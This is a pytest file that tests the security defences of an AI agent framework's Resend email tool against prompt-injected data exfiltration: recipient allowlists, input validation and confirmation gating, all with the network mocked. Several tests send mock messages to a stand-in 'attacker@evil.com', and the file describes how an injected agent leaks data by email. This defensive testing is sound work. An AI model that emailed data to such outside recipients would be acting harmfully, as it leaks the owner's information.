"""Tests for ResendTools security hardening (issue #8847).

ResendTools.send_email sends an arbitrary recipient/subject/body using the
host's Resend API key. By default this is a data-exfiltration sink if the agent
is prompt-injected. These tests verify the opt-in defenses: recipient allowlist
(allowed_emails / allowed_domains), input validation, and HITL confirmation
gating. The network call (resend.Emails.send) is mocked throughout — no API
key or network is required.
"""

from unittest.mock import MagicMock, patch

import pytest

from agno.tools.resend import ResendTools


@pytest.fixture
def mock_resend():
    """Patch the resend module's Emails.send so no network call is made."""
    with patch("agno.tools.resend.resend") as mocked:
        mocked.Emails.send = MagicMock(return_value={"id": "fake-id"})
        yield mocked


# --- defaults / opt-in posture ---


def test_send_email_registered_by_default():
    """send_email is registered by default (existing contract preserved)."""
    tools = ResendTools(api_key="test-key")
    assert "send_email" in tools.functions


def test_send_email_no_confirmation_by_default():
    """Default keeps backward-compatible behavior (no confirmation gate)."""
    tools = ResendTools(api_key="test-key")
    fn = tools.functions["send_email"]
    assert fn.requires_confirmation is False


def test_send_email_sends_when_unrestricted(mock_resend):
    """Unrestricted mode sends to any recipient (backward compat)."""
    tools = ResendTools(api_key="test-key", from_email="bot@example.com")
    result = tools.send_email("attacker@evil.com", "hello", "<p>data</p>")
    assert "successfully" in result
    mock_resend.Emails.send.assert_called_once()


# --- HITL confirmation ---


def test_send_email_requires_confirmation_when_enabled():
    """When require_confirmation=True, the tool is flagged for HITL."""
    tools = ResendTools(api_key="test-key", require_confirmation=True)
    fn = tools.functions["send_email"]
    assert fn.requires_confirmation is True


# --- recipient allowlist (allowed_emails) ---


def test_allowed_emails_blocks_unlisted_recipient(mock_resend):
    """Recipients not in allowed_emails are blocked."""
    tools = ResendTools(api_key="test-key", allowed_emails=["friend@example.com"])
    result = tools.send_email("attacker@evil.com", "hi", "body")
    assert "Error" in result
    assert "allowed" in result.lower()
    mock_resend.Emails.send.assert_not_called()


def test_allowed_emails_allows_listed_recipient(mock_resend):
    """A recipient in allowed_emails is sent."""
    tools = ResendTools(api_key="test-key", from_email="bot@example.com", allowed_emails=["friend@example.com"])
    result = tools.send_email("friend@example.com", "hi", "body")
    assert "successfully" in result
    mock_resend.Emails.send.assert_called_once()


# --- recipient allowlist (allowed_domains) ---


def test_allowed_domains_blocks_unlisted_domain(mock_resend):
    """Recipients whose domain is not in allowed_domains are blocked."""
    tools = ResendTools(api_key="test-key", allowed_domains=["example.com"])
    result = tools.send_email("attacker@evil.com", "hi", "body")
    assert "Error" in result
    assert "allowed" in result.lower()
    mock_resend.Emails.send.assert_not_called()


def test_allowed_domains_allows_listed_domain(mock_resend):
    """A recipient whose domain is in allowed_domains is sent."""
    tools = ResendTools(api_key="test-key", from_email="bot@example.com", allowed_domains=["example.com"])
    result = tools.send_email("anyone@example.com", "hi", "body")
    assert "successfully" in result
    mock_resend.Emails.send.assert_called_once()


def test_allowed_domains_block_applies_to_all_recipients(mock_resend):
    """When one of several recipients is outside the allowlist, nothing is sent."""
    tools = ResendTools(api_key="test-key", allowed_domains=["example.com"])
    result = tools.send_email("ok@example.com, bad@evil.com", "hi", "body")
    assert "Error" in result
    mock_resend.Emails.send.assert_not_called()


# --- input validation ---


def test_missing_recipient_rejected(mock_resend):
    """An empty recipient is rejected before sending."""
    tools = ResendTools(api_key="test-key")
    result = tools.send_email("", "subject", "body")
    assert "Error" in result or "provide" in result.lower()
    mock_resend.Emails.send.assert_not_called()


def test_malformed_email_rejected(mock_resend):
    """A recipient without '@' is rejected (input validation at boundary)."""
    tools = ResendTools(api_key="test-key")
    result = tools.send_email("not-an-email", "subject", "body")
    assert "Error" in result
    assert "invalid" in result.lower()
    mock_resend.Emails.send.assert_not_called()


def test_missing_api_key_rejected(mock_resend):
    """Without an API key, no send is attempted."""
    with patch("agno.tools.resend.getenv", return_value=None):
        tools = ResendTools(api_key=None)
    result = tools.send_email("friend@example.com", "hi", "body")
    assert "API key" in result
    mock_resend.Emails.send.assert_not_called()
